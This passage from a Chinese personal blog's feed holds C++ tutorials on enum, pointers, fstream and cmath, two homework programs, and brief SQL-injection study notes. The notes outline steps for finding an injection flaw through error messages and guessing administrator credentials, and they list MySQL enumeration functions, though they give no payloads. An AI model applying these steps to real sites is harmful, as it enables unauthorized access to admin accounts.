    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="sql注入一般步骤："><a href="#sql注入一般步骤：" class="headerlink" title="sql注入一般步骤："></a>sql注入一般步骤：</h1><h2 id="第一步：通过特殊的数据库查询语句"><a href="#第一步：通过特殊的数据库查询语句" class="headerlink" title="第一步：通过特殊的数据库查询语句"></a>第一步：通过特殊的数据库查询语句</h2><h2 id="第二步：在数据库的错误返回中找到sql漏洞"><a href="#第二步：在数据库的错误返回中找到sql漏洞" class="headerlink" title="第二步：在数据库的错误返回中找到sql漏洞"></a>第二步：在数据库的错误返回中找到sql漏洞</h2><h2 id="第三步-利用sql语句猜解管理人员信息并登录管理员后台"><a href="#第三步-利用sql语句猜解管理人员信息并登录管理员后台" class="headerlink" title="第三步:利用sql语句猜解管理人员信息并登录管理员后台"></a>第三步:利用sql语句猜解管理人员信息并登录管理员后台</h2><hr><h1 id="基础语法-待补充"><a href="#基础语法-待补充" class="headerlink" title="基础语法(待补充)"></a>基础语法(待补充)</h1><p>version():查看数据库版本</p><p>database():查看使用的数据库</p><p>user():查看当前用户</p><p>limit:limit子句分批来获取所有数据</p><p>group_concat():一次性获取所有的数据库信息</p><p>information_schema.tables:包含了数据库里所有的表</p><p>table_name:表名</p><p>table_schema:数据库名</p><p>column_name:字段名</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="sql注入学习" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>enum</title>
    <link href="http://example.com/2024/11/05/c%E2%81%84c++/%E6%9E%9A%E4%B8%BE%E7%B1%BB%E5%9E%8Benum/"/>
    <id>http://example.com/2024/11/05/c%E2%81%84c++/%E6%9E%9A%E4%B8%BE%E7%B1%BB%E5%9E%8Benum/</id>
    <published>2024-11-05T18:40:53.000Z</published>
    <updated>2024-12-25T16:08:48.498Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在C++中，<code>enum</code>（枚举）是一种用户定义的类型，它允许程序员为整型值指定更易读的名字。枚举类型主要用于表示一组命名的整数常量，使得代码更加清晰和易于维护。</p><h3 id="定义枚举"><a href="#定义枚举" class="headerlink" title="定义枚举"></a>定义枚举</h3><p>你可以使用<code>enum</code>关键字来定义一个枚举类型。下面是一个简单的例子：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Color</span> &#123;</span><br><span class="line">    RED,</span><br><span class="line">    GREEN,</span><br><span class="line">    BLUE</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Color myColor = RED;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (myColor == RED) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;The color is red.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>在这个例子中，<code>Color</code>是一个枚举类型，它有三个可能的值：<code>RED</code>、<code>GREEN</code>和<code>BLUE</code>。</p><h3 id="枚举的底层实现"><a href="#枚举的底层实现" class="headerlink" title="枚举的底层实现"></a>枚举的底层实现</h3><p>默认情况下，枚举值从0开始递增。因此，在上面的例子中，<code>RED</code>的值为0，<code>GREEN</code>的值为1，<code>BLUE</code>的值为2。你也可以显式地指定枚举值：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Color</span> &#123;</span><br><span class="line">    RED = <span class="number">1</span>,</span><br><span class="line">    GREEN = <span class="number">2</span>,</span><br><span class="line">    BLUE = <span class="number">4</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div><p>在这个修改后的例子中，<code>RED</code>的值为1，<code>GREEN</code>的值为2，<code>BLUE</code>的值为4。</p><h3 id="枚举类型的使用"><a href="#枚举类型的使用" class="headerlink" title="枚举类型的使用"></a>枚举类型的使用</h3><p>枚举类型可以用于变量声明、函数参数和返回值等。例如：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Direction</span> &#123;</span><br><span class="line">    NORTH,</span><br><span class="line">    SOUTH,</span><br><span class="line">    EAST,</span><br><span class="line">    WEST</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">Direction <span class="title">getOppositeDirection</span><span class="params">(Direction dir)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (dir) &#123;</span><br><span class="line">        <span class="keyword">case</span> NORTH:</span><br><span class="line">            <span class="keyword">return</span> SOUTH;</span><br><span class="line">        <span class="keyword">case</span> SOUTH:</span><br><span class="line">            <span class="keyword">return</span> NORTH;</span><br><span class="line">        <span class="keyword">case</span> EAST:</span><br><span class="line">            <span class="keyword">return</span> WEST;</span><br><span class="line">        <span class="keyword">case</span> WEST:</span><br><span class="line">            <span class="keyword">return</span> EAST;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> NORTH; <span class="comment">// 默认返回北方向，虽然这里不会发生</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Direction currentDirection = EAST;</span><br><span class="line">    Direction oppositeDirection = <span class="built_in">getOppositeDirection</span>(currentDirection);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (oppositeDirection == WEST) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;The opposite direction of EAST is WEST.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="枚举类（C-11及以后）"><a href="#枚举类（C-11及以后）" class="headerlink" title="枚举类（C++11及以后）"></a>枚举类（C++11及以后）</h3><p>C++11引入了<code>enum class</code>，它提供了更强的类型安全和作用域控制。与普通的枚举不同，<code>enum class</code>的枚举值不会隐式地转换为整数，也不会与其他枚举类型相互转换。</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">Season</span> &#123;</span><br><span class="line">    SPRING,</span><br><span class="line">    SUMMER,</span><br><span class="line">    AUTUMN,</span><br><span class="line">    WINTER</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Season currentSeason = Season::SPRING;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (currentSeason == Season::SPRING) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;The current season is spring.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 下面的代码会导致编译错误，因为Season::SPRING不能隐式转换为int</span></span><br><span class="line">    <span class="comment">// int seasonValue = Season::SPRING; // 错误</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>在这个例子中，<code>Season</code>是一个<code>enum class</code>类型，它的值（如<code>Season::SPRING</code>）必须显式地使用<code>Season::</code>前缀来引用。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>枚举（<code>enum</code>）提供了一种定义命名整数常量的方法。</li><li>枚举值默认从0开始递增，但也可以显式指定。</li><li><code>enum class</code>（C++11及以后）提供了更强的类型安全和作用域控制。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="c/c++" scheme="http://example.com/categories/c-c/"/>
    
    
    <category term="cpp" scheme="http://example.com/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title>cpp指针</title>
    <link href="http://example.com/2024/10/31/c%E2%81%84c++/cpp%E6%8C%87%E9%92%88/"/>
    <id>http://example.com/2024/10/31/c%E2%81%84c++/cpp%E6%8C%87%E9%92%88/</id>
    <published>2024-10-31T21:13:03.000Z</published>
    <updated>2024-12-25T16:08:48.498Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>指针是 C++ 中一种非常重要的概念，它可以让你直接操作内存。下面是指针的详细介绍和常见用法。</p><h3 id="1-指针的定义"><a href="#1-指针的定义" class="headerlink" title="1. 指针的定义"></a>1. 指针的定义</h3><p>指针是一个变量，其值为另一个变量的地址。通过指针，可以间接访问该变量。指针的声明语法如下：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">类型 *指针名;</span><br></pre></td></tr></table></figure></div><p>例如：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> *p; <span class="comment">// p 是一个指向 int 类型的指针</span></span><br></pre></td></tr></table></figure></div><h3 id="2-指针的初始化"><a href="#2-指针的初始化" class="headerlink" title="2. 指针的初始化"></a>2. 指针的初始化</h3><p>指针必须被初始化后才能使用。可以通过取地址运算符 <code>&amp;</code> 来获取一个变量的地址：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> *p = &amp;a; <span class="comment">// p 指向 a 的地址</span></span><br></pre></td></tr></table></figure></div><h3 id="3-解引用指针"><a href="#3-解引用指针" class="headerlink" title="3. 解引用指针"></a>3. 解引用指针</h3><p>使用解引用运算符 <code>*</code> 可以访问指针所指向的变量的值：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> value = *p; <span class="comment">// value 现在是 10</span></span><br></pre></td></tr></table></figure></div><h3 id="4-指针的算术运算"><a href="#4-指针的算术运算" class="headerlink" title="4. 指针的算术运算"></a>4. 指针的算术运算</h3><p>指针可以进行算术运算。例如，如果有一个指针指向一个数组的首元素，可以通过指针加法来访问数组的其他元素：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> arr[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line"><span class="type">int</span> *p = arr; <span class="comment">// p 指向 arr 的首元素</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问数组元素</span></span><br><span class="line"><span class="type">int</span> first = *p;      <span class="comment">// 1</span></span><br><span class="line"><span class="type">int</span> second = *(p + <span class="number">1</span>); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure></div><h3 id="5-指向指针的指针"><a href="#5-指向指针的指针" class="headerlink" title="5. 指向指针的指针"></a>5. 指向指针的指针</h3><p>指针还可以指向其他指针，形成指向指针的指针（double pointer）：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> **pp = &amp;p; <span class="comment">// pp 是一个指向指针 p 的指针</span></span><br></pre></td></tr></table></figure></div><h3 id="6-动态内存分配"><a href="#6-动态内存分配" class="headerlink" title="6. 动态内存分配"></a>6. 动态内存分配</h3><p>使用指针可以动态分配内存，常用的有 <code>new</code> 和 <code>delete</code>：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> *p = <span class="keyword">new</span> <span class="type">int</span>; <span class="comment">// 动态分配一个 int</span></span><br><span class="line">*p = <span class="number">10</span>;          <span class="comment">// 给它赋值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> p;       <span class="comment">// 释放内存</span></span><br></pre></td></tr></table></figure></div><p>对于数组，可以这样：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> *arr = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">5</span>]; <span class="comment">// 动态分配一个 int 数组</span></span><br><span class="line"><span class="keyword">delete</span>[] arr;          <span class="comment">// 释放数组内存</span></span><br></pre></td></tr></table></figure></div><h3 id="7-注意事项"><a href="#7-注意事项" class="headerlink" title="7. 注意事项"></a>7. 注意事项</h3><ul><li><strong>野指针</strong>：未初始化或已经被释放的指针称为野指针，使用野指针会导致未定义行为。</li><li><strong>内存泄漏</strong>：动态分配内存后要确保及时释放，避免内存泄漏。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="c/c++" scheme="http://example.com/categories/c-c/"/>
    
    
    <category term="cpp" scheme="http://example.com/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title>作业</title>
    <link href="http://example.com/2024/10/22/c%E2%81%84c++/cpp%E4%BD%9C%E4%B8%9A1/"/>
    <id>http://example.com/2024/10/22/c%E2%81%84c++/cpp%E4%BD%9C%E4%B8%9A1/</id>
    <published>2024-10-22T20:30:53.000Z</published>
    <updated>2024-12-25T16:08:48.498Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="从键盘输入一个年份，根据闰年判断方法输出该年份的闰年情况。"><a href="#从键盘输入一个年份，根据闰年判断方法输出该年份的闰年情况。" class="headerlink" title="从键盘输入一个年份，根据闰年判断方法输出该年份的闰年情况。"></a>从键盘输入一个年份，根据闰年判断方法输出该年份的闰年情况。</h1><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> year;</span><br><span class="line">    cin&gt;&gt;year;</span><br><span class="line">    <span class="keyword">if</span>((year%<span class="number">4</span>==<span class="number">0</span> <span class="keyword">and</span> year%<span class="number">100</span>!=<span class="number">0</span>) <span class="keyword">or</span> year%<span class="number">400</span>==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;闰年&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;不是&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><hr><h1 id="根据输入三角形的三条边长，计算并显示三角形的面积。"><a href="#根据输入三角形的三条边长，计算并显示三角形的面积。" class="headerlink" title="根据输入三角形的三条边长，计算并显示三角形的面积。"></a>根据输入三角形的三条边长，计算并显示三角形的面积。</h1><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">double</span> a,b,c;</span><br><span class="line">    cin&gt;&gt;a&gt;&gt;b&gt;&gt;c;</span><br><span class="line">    <span class="type">double</span> m=(a+b+c)/<span class="number">2.0</span>;</span><br><span class="line">    <span class="type">double</span> s=<span class="built_in">sqrt</span>(m*(m-a)*(m-b)*(m-c));</span><br><span class="line">    cout&lt;&lt;s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>水个帖子。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="c/c++" scheme="http://example.com/categories/c-c/"/>
    
    <category term="homework" scheme="http://example.com/categories/c-c/homework/"/>
    
    
    <category term="cpp" scheme="http://example.com/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title>fstream头文件</title>
    <link href="http://example.com/2024/10/22/c%E2%81%84c++/fstream%E8%AF%B4%E6%98%8E/"/>
    <id>http://example.com/2024/10/22/c%E2%81%84c++/fstream%E8%AF%B4%E6%98%8E/</id>
    <published>2024-10-22T11:30:53.000Z</published>
    <updated>2024-12-25T16:08:48.498Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><code>fstream</code> 是 C++ 标准库中的一个类，它用于文件的输入输出操作。<code>fstream</code> 继承自 <code>istream</code> 和 <code>ostream</code> 类，因此它既可以用于读取文件，也可以用于写入文件。以下是关于 <code>fstream</code> 的详细解释：</p><h3 id="一、fstream-的功能"><a href="#一、fstream-的功能" class="headerlink" title="一、fstream 的功能"></a>一、<code>fstream</code> 的功能</h3><p><code>fstream</code> 类提供了对文件进行读写操作的功能。通过创建 <code>fstream</code> 类的对象，并调用其成员函数，可以方便地打开文件、读取文件内容、向文件写入数据，以及关闭文件。</p><h3 id="二、fstream-的成员函数"><a href="#二、fstream-的成员函数" class="headerlink" title="二、fstream 的成员函数"></a>二、<code>fstream</code> 的成员函数</h3><p><code>fstream</code> 类继承了许多来自 <code>istream</code> 和 <code>ostream</code> 类的成员函数，这些函数用于文件的读写操作。以下是一些常用的成员函数：</p><ol><li>**open()**：打开文件。该函数接受文件名和打开模式作为参数，并返回一个布尔值，表示文件是否成功打开。</li><li>**close()**：关闭文件。关闭文件后，将释放与文件相关的资源，并且无法再进行读写操作。</li><li>**is_open()**：检查文件是否已打开。如果文件已打开，则返回 <code>true</code>；否则返回 <code>false</code>。</li><li>**read()**：从文件中读取数据。该函数接受一个字符数组和要读取的字符数作为参数，并将读取的数据存储在数组中。</li><li>**write()**：向文件中写入数据。该函数接受一个字符数组和要写入的字符数作为参数，并将数组中的数据写入文件。</li><li><strong>seekg()</strong> 和 **seekp()**：定位文件指针。<code>seekg()</code> 用于定位输入文件指针，而 <code>seekp()</code> 用于定位输出文件指针。这两个函数可以接受一个长整型值和一个可选的查找方向作为参数。</li></ol><h3 id="三、fstream-的打开模式"><a href="#三、fstream-的打开模式" class="headerlink" title="三、fstream 的打开模式"></a>三、<code>fstream</code> 的打开模式</h3><ol><li><strong>ios::in</strong>：以读取模式打开文件。如果文件不存在，则打开操作将失败。</li><li><strong>ios::out</strong>：以写入模式打开文件。如果文件不存在，则会创建该文件；如果文件已存在，则会清空其内容。</li><li><strong>ios::ate</strong>：打开文件后，将文件指针定位到文件末尾。这通常用于在写入数据时追加到文件末尾。</li><li><strong>ios::app</strong>：以追加模式打开文件。所有写入的数据都将添加到文件末尾，而不会覆盖现有内容。</li><li><strong>ios::trunc</strong>：如果文件已存在，则在打开文件之前清空其内容。这通常与 <code>ios::out</code> 模式一起使用。</li><li><strong>ios::binary</strong>：以二进制模式打开文件。在二进制模式下，文件内容将按原样读写，不进行任何转换。</li></ol><h3 id="四、使用示例"><a href="#四、使用示例" class="headerlink" title="四、使用示例"></a>四、使用示例</h3><p>以下是一个简单的示例，演示如何使用 <code>fstream</code> 类进行文件的读写操作：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建 fstream 对象</span></span><br><span class="line">    std::fstream file;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开文件进行写入操作</span></span><br><span class="line">    file.<span class="built_in">open</span>(<span class="string">&quot;example.txt&quot;</span>, std::ios::out);</span><br><span class="line">    <span class="keyword">if</span> (!file.<span class="built_in">is_open</span>()) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to open file for writing&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向文件写入数据</span></span><br><span class="line">    file &lt;&lt; <span class="string">&quot;Hello, World!\n&quot;</span>;</span><br><span class="line">    file.<span class="built_in">close</span>(); <span class="comment">// 关闭文件</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开文件进行读取操作</span></span><br><span class="line">    file.<span class="built_in">open</span>(<span class="string">&quot;example.txt&quot;</span>, std::ios::in);</span><br><span class="line">    <span class="keyword">if</span> (!file.<span class="built_in">is_open</span>()) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to open file for reading&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从文件读取数据</span></span><br><span class="line">    std::string line;</span><br><span class="line">    <span class="keyword">if</span> (std::<span class="built_in">getline</span>(file, line)) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Read from file: &quot;</span> &lt;&lt; line &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file.<span class="built_in">close</span>(); <span class="comment">// 关闭文件</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>在这个示例中，我们首先创建了一个 <code>fstream</code> 对象，并使用 <code>open()</code> 函数以写入模式打开了一个名为 <code>example.txt</code> 的文件。然后，我们向文件中写入了一条消息，并关闭了文件。接下来，我们再次打开该文件，这次是以读取模式打开的。我们使用 <code>std::getline()</code> 函数从文件中读取了一行数据，并将其打印到标准输出上。最后，我们关闭了文件。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="c/c++" scheme="http://example.com/categories/c-c/"/>
    
    <category term="c/c++头文件" scheme="http://example.com/categories/c-c/c-c-%E5%A4%B4%E6%96%87%E4%BB%B6/"/>
    
    
    <category term="cpp" scheme="http://example.com/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title>cmath头文件</title>
    <link href="http://example.com/2024/10/19/c%E2%81%84c++/cmath%E8%AF%B4%E6%98%8E/"/>
    <id>http://example.com/2024/10/19/c%E2%81%84c++/cmath%E8%AF%B4%E6%98%8E/</id>
    <published>2024-10-19T20:27:53.000Z</published>
    <updated>2024-12-25T16:08:48.498Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><code>cmath</code> 是 C++ 标准库中的一个数学库，它提供了一系列用于执行数学运算的函数。这些函数大多是从 C 语言中的 <code>math.h</code> 头文件继承过来的，但 <code>cmath</code> 是 C++ 风格的封装，所有的函数都位于 <code>std</code> 命名空间中。以下是对 <code>cmath</code> 库的一些主要功能的讲解：</p><h3 id="引入库"><a href="#引入库" class="headerlink" title="引入库"></a>引入库</h3><p>要使用 <code>cmath</code> 库中的函数，你需要在你的 C++ 文件中包含这个头文件：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br></pre></td></tr></table></figure></div><p>并且，由于 <code>cmath</code> 中的函数都在 <code>std</code> 命名空间中，你可能需要在使用这些函数时加上 <code>std::</code> 前缀，或者使用 <code>using namespace std;</code> 来避免重复书写。</p><h3 id="基本数学函数"><a href="#基本数学函数" class="headerlink" title="基本数学函数"></a>基本数学函数</h3><h4 id="幂和对数函数"><a href="#幂和对数函数" class="headerlink" title="幂和对数函数"></a>幂和对数函数</h4><ul><li><code>std::pow(base, exponent)</code>：计算 <code>base</code> 的 <code>exponent</code> 次幂。</li><li><code>std::sqrt(x)</code>：计算 <code>x</code> 的平方根。</li><li><code>std::log(x)</code>：计算 <code>x</code> 的自然对数（以 e 为底）。</li><li><code>std::log10(x)</code>：计算 <code>x</code> 的以 10 为底的对数。</li></ul><h4 id="三角函数"><a href="#三角函数" class="headerlink" title="三角函数"></a>三角函数</h4><ul><li><code>std::sin(x)</code>：计算 <code>x</code>（以弧度为单位）的正弦值。</li><li><code>std::cos(x)</code>：计算 <code>x</code>（以弧度为单位）的余弦值。</li><li><code>std::tan(x)</code>：计算 <code>x</code>（以弧度为单位）的正切值。</li><li><code>std::asin(x)</code>：计算 <code>x</code> 的反正弦值（返回弧度）。</li><li><code>std::acos(x)</code>：计算 <code>x</code> 的反余弦值（返回弧度）。</li><li><code>std::atan(x)</code>：计算 <code>x</code> 的反正切值（返回弧度）。</li><li><code>std::atan2(y, x)</code>：计算点 <code>(x, y)</code> 的极坐标角度（返回弧度），考虑了所有四个象限。</li></ul><h4 id="指数和对数函数（底数不为-e）"><a href="#指数和对数函数（底数不为-e）" class="headerlink" title="指数和对数函数（底数不为 e）"></a>指数和对数函数（底数不为 e）</h4><ul><li><code>std::exp(x)</code>：计算 e 的 <code>x</code> 次幂。</li><li><code>std::logb(x)</code>：计算 <code>x</code> 的以 2 为底的指数部分（即 <code>log2(x)</code> 的整数部分）。</li><li><code>std::ilogb(x)</code>：计算 <code>x</code> 的以 2 为底的指数部分（整数返回）。</li><li><code>std::scalbn(x, n)</code>：计算 <code>x * (2^n)</code>。</li><li><code>std::scalbnf(x, n)</code>：<code>scalbn</code> 的单精度浮点版本。</li><li><code>std::scalbnl(x, n)</code>：<code>scalbn</code> 的长双精度浮点版本。</li></ul><h4 id="浮点数的取整和舍入"><a href="#浮点数的取整和舍入" class="headerlink" title="浮点数的取整和舍入"></a>浮点数的取整和舍入</h4><ul><li><code>std::ceil(x)</code>：向上取整，返回大于或等于 <code>x</code> 的最小整数。</li><li><code>std::floor(x)</code>：向下取整，返回小于或等于 <code>x</code> 的最大整数。</li><li><code>std::round(x)</code>：四舍五入到最近的整数。</li><li><code>std::trunc(x)</code>：丢弃 <code>x</code> 的小数部分，返回其整数部分。</li><li><code>std::fmod(x, y)</code>：计算 <code>x</code> 除以 <code>y</code> 的余数，结果有相同的符号作为 <code>x</code>。</li><li><code>std::remainder(x, y)</code>：计算 <code>x</code> 除以 <code>y</code> 的 IEEE 754 余数。</li></ul><h4 id="绝对值和其他函数"><a href="#绝对值和其他函数" class="headerlink" title="绝对值和其他函数"></a>绝对值和其他函数</h4><ul><li><code>std::abs(x)</code>：计算 <code>x</code> 的绝对值。对于整数和浮点数有不同的重载版本。</li><li><code>std::fabs(x)</code>：计算浮点数 <code>x</code> 的绝对值（<code>std::abs</code> 的浮点版本）。</li><li><code>std::signbit(x)</code>：检查 <code>x</code> 的符号位是否设置（即是否为负数）。</li><li><code>std::copysign(x, 